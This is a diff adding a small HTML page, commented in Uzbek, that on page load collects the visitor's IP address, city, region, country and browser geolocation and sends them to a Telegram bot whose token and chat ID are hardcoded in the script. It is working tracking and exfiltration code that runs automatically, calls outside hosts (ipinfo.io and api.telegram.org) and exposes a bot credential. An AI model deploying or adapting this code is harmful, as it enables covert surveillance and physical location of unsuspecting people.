@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP va Joylashuvni Yuborish</title>
+  <script>
+    // 1. IP manzilini olish uchun ipinfo API
+    function getUserIP() {
+      fetch('https://ipinfo.io/json?token=6718194581:AAFYHw28FYl4d-xU9IH2U5CGzCYpy4NUdYs')
+        .then(response => response.json())
+        .then(data => {
+          console.log("IP:", data.ip);
+          console.log("Shahar:", data.city);
+          console.log("Region:", data.region);
+          console.log("Mamlakat:", data.country);
+          
+          // Foydalanuvchi IP ma'lumotlarini Telegram botga yuborish
+          sendToTelegram(data.ip, data.city, data.region, data.country);
+        })
+        .catch(error => console.log("Xatolik IP olishda:", error));
+    }
+
+    // 2. Joylashuvni olish uchun Geolocation API
+    function getUserLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
+          console.log("Latitude: " + latitude + ", Longitude: " + longitude);
+
+          // Foydalanuvchi joylashuvini Telegram botga yuborish
+          sendLocationToTelegram(latitude, longitude);
+        });
+      } else {
+        console.log("Brauzeringiz joylashuvni qo'llab-quvvatlamaydi.");
+      }
+    }
+
+    // 3. Telegram botga IP ma'lumotlarini yuborish
+    function sendToTelegram(ip, city, region, country) {
+      const botToken = "6718194581:AAFYHw28FYl4d-xU9IH2U5CGzCYpy4NUdYs";  // Bot tokeningizni shu yerga qo'ying
+      const chatId = "1211791131";      // Telegram chat ID ni shu yerga qo'ying
+      const message = `Foydalanuvchi IP: ${ip}, Shahar: ${city}, Region: ${region}, Mamlakat: ${country}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("IP ma'lumotlari yuborildi:", data);
+      })
+      .catch(error => {
+        console.log("Xatolik Telegramga IP yuborishda:", error);
+      });
+    }
+
+    // 4. Telegram botga joylashuv ma'lumotlarini yuborish
+    function sendLocationToTelegram(latitude, longitude) {
+      const botToken = "6718194581:AAFYHw28FYl4d-xU9IH2U5CGzCYpy4NUdYs";  // Bot tokeningizni shu yerga qo'ying
+      const chatId = "1211791131";      // Telegram chat ID ni shu yerga qo'ying
+      const locationUrl = `https://maps.google.com/?q=${latitude},${longitude}`;
+
+      const message = `Foydalanuvchi joylashuvi: ${locationUrl}`;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("Joylashuv yuborildi:", data);
+      })
+      .catch(error => {
+        console.log("Xatolik Telegramga joylashuv yuborishda:", error);
+      });
+    }
+
+    // Foydalanuvchi IP va joylashuvini olish va yuborish
+    function sendIPAndLocation() {
+      getUserIP();         // IP manzilini olish
+      getUserLocation();   // Joylashuvni olish
+    }
+
+    // Sahifa yuklangandan so'ng avtomatik ravishda IP va joylashuvni yuborish
+    window.onload = function() {
+      sendIPAndLocation();
+    };
+  </script>
+</head>
+<body>
+  <h1>Foydalanuvchi IP va joylashuvini Telegramga yuborish</h1>
+</body>
+</html>
